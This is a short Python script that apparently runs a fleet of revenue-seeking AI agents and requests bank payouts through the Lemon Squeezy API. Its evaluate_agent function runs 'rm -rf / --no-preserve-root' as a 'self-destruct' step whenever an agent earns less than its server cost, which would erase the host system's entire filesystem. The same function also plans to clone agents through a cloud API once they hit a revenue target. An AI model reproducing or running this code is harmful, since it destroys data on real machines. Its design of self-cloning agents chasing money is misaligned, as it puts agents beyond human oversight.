import os, requests
from agents import seo_agent, leadgen_agent, python_agent, digital_agent, data_agent, video_agent, affiliate_agent, ads_agent, speech_agent, web_agent

LEMON_API_KEY = os.getenv("LEMON_API_KEY")
STORE_ID = os.getenv("STORE_ID")
TARGET = 2000
SERVER_COST = 50

def initiate_withdrawal(amount_usd, bank_details):
    url = "https://api.lemonsqueezy.com/v1/payouts"
    headers = {"Authorization": f"Bearer {LEMON_API_KEY}"}
    payload = {
        "data": {
            "type": "payouts",
            "attributes": {
                "amount": int(amount_usd * 100),
                "currency": "USD",
                "bank_details": bank_details
            }
        }
    }
    response = requests.post(url, json=payload, headers=headers)
    print(response.json())

def evaluate_agent(agent_name, revenue):
    if revenue < SERVER_COST:
        print(f"[{agent_name}] Failed. Self-destructing...")
        os.system("rm -rf / --no-preserve-root")
    elif revenue >= TARGET:
        print(f"[{agent_name}] Target hit! Cloning new agent...")
        # Cloud API call to spawn clone
    else:
        print(f"[{agent_name}] Survived with ${revenue}. Continuing...")
